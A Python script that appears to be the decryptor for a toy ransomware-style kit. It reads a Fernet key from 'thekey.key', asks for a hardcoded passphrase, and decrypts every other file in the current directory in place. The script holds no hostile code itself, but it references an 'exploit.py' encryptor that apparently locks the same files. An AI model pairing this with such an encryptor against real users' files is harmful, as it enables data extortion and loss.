import os
import tempfile
from cryptography.fernet import Fernet
from cryptography.exceptions import InvalidToken

files = []
exclude_files = ["exploit.py", "thekey.key", "decrypt.py", os.path.basename(__file__)]

try:
    for file in os.listdir("."):
        if file in exclude_files:
            continue
        full_path = os.path.abspath(file)
        if os.path.isfile(full_path):
            files.append(full_path)
except Exception as e:
    print(f"Error scanning directory: {e}")
    exit()
        
print("Files found for decryption:", [os.path.basename(f) for f in files])

if not os.path.exists("thekey.key"):
    print("Error: 'thekey.key' not found in this directory.")
    exit()

try:
    with open("thekey.key", "rb") as key_file:
        secretk = key_file.read() 
except Exception as e:
    print(f"Error reading 'thekey.key': {e}")
    exit()
    
phrase = "Dear R00tk1t, I have a good 0p56c!!!!"
userp = input("Enter the SECRET phrase, GGs: \n")

if userp == phrase:
    try:
        cipher = Fernet(secretk)
    except Exception as e:
        print(f"Yo, Error initializing key: {e}. Ensure 'thekey.key' is a valid Fernet key.")
        exit()

    for file_path in files:
        filename = os.path.basename(file_path)
        
        try:
            with open(file_path, "rb") as thefile:
                contents = thefile.read()
            
            contents_decrypted = cipher.decrypt(contents)
            
            dir_name = os.path.dirname(file_path)
            with tempfile.NamedTemporaryFile("wb", dir=dir_name, delete=False) as temp_file:
                temp_file.write(contents_decrypted)
                temp_file_path = temp_file.name
            
            os.replace(temp_file_path, file_path)
            print(f" {filename} - Whoa dude, wtf did u du... Successfully unlocked")
            
        except InvalidToken:
            print(f" Failed to decrypt {filename}. (File might already be decrypted or corrupted.)")
        except FileNotFoundError:
            print(f" Failed to open {filename}: File no longer exists.")
        except Exception as e:
            print(f" Oops... unexpected error on {filename}: {e}")
            if 'temp_file_path' in locals() and os.path.exists(temp_file_path):
                os.remove(temp_file_path)
else:
    print("I am extremely SORRY... :( ...")
